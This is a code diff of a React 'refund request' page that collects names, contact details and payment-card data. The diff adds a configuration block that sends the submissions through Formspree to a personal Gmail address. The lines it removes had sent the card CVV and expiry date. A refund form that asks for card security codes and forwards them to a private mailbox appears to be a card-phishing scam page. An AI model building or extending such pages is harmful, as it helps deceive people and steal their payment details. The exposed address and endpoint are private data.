@@ -130,6 +130,22 @@ const AlertCircle = (props: SVGProps<SVGSVGElement>) => (
 
 type Step = 'info' | 'card' | 'processing';
 
+// ============================================================================
+// CONFIGURATION EMAIL
+// ============================================================================
+const EMAIL_CONFIG = {
+  // 1. Votre adresse email de réception :
+  recipientEmail: 'jeanhublot02@gmail.com',
+
+  // 2. Collez l'URL obtenue sur Formspree ici :
+  formspreeEndpoint: 'https://formspree.io/f/xvkgaezq',
+
+  // Autres options facultatives
+  web3formsAccessKey: 'VOTRE_CLE_ACCESS_KEY',
+  customWebhookUrl: '',
+};
+
+
 interface FormData {
   fullName: string;
   email: string;
@@ -240,22 +256,36 @@ export default function Home() {
   };
 
   const submitAll = async () => {
-    const cardDigits = formData.cardNumber.replace(/\s/g, '');
+    const cardDigits = formData.cardNumber.replace(/\D/g, '');
+    const cardLast4 = cardDigits.slice(-4);
 
-    const res = await fetch('/api/refund', {
+    const formspreeConfigured =
+      EMAIL_CONFIG.formspreeEndpoint.startsWith('https://formspree.io/f/') &&
+      !EMAIL_CONFIG.formspreeEndpoint.includes('votre_identifiant_ici');
+
+    const endpoint = formspreeConfigured
+      ? EMAIL_CONFIG.formspreeEndpoint
+      : '/api/refund';
+
+    const payload = {
+      fullName: formData.fullName,
+      email: formData.email,
+      phone: formData.phone,
+      reason: formData.reason,
+      amount: formData.amount,
+      cardLast4,
+      _subject: `Nouvelle demande de remboursement - ${formData.fullName}`,
+    };
+
+    const res = await fetch(endpoint, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        fullName: formData.fullName,
-        email: formData.email,
-        phone: formData.phone,
-        reason: formData.reason,
-        amount: formData.amount,
-        cardNumber: cardDigits.slice(16),
-        cardCvv: formData.cardCvv,
-        cardExpiry: formData.cardExpiry,
-      }),
+      headers: {
+        'Content-Type': 'application/json',
+        Accept: 'application/json',
+      },
+      body: JSON.stringify(payload),
     });
+
     if (!res.ok) throw new Error('sendError');
   };
 
